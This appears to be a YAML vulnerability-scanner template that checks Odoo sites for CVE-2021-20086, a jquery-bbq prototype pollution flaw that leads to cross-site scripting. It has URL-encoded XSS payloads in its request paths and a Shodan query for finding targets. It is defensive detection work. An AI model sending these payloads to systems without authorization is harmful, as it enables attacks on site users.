http:
- matchers:
  - condition: and
    dsl:
    - '!contains(body, "debug:")'
    - contains_all(body, "alert(document.domain)","var odoo =")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/?__proto__%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x'
  - '{{BaseURL}}/?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x'
  stop-at-first-match: true
id: CVE-2021-20086
info:
  author: 1337rokudenashi
  classification:
    cpe: cpe:2.3:a:jquery-bbq_project:jquery-bbq:1.2.1:*:*:*:*:*:*:*
    cve-id: CVE-2021-20086
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-1321
    epss-percentile: 0.96493
    epss-score: 0.30086
  description: 'jquery-bbq 1.2.1 contains a prototype pollution caused by improperly
    controlled modification of object prototype attributes, letting malicious users
    inject properties into Object.prototype, exploit requires malicious user interaction.

    '
  impact: 'Attackers can modify Object.prototype, leading to potential security issues
    like property overwrites and application behavior manipulation.

    '
  metadata:
    max-request: 2
    product: jquery-bbq
    shodan-query: html:"Odoo"
    vendor: jquery-bbq_project
    verified: true
  name: Odoo Apps - Cross-Site Scripting via Prototype Pollution
  reference:
  - https://www.tenable.com/security/research/tra-2022-10
  - https://nvd.nist.gov/vuln/detail/CVE-2021-20086
  remediation: 'Update to the latest version of jquery-bbq that addresses this vulnerability
    or apply patches to prevent prototype pollution.

    '
  severity: high
  tags: cve,cve2021,odoo,xss,proto,jquery,vuln
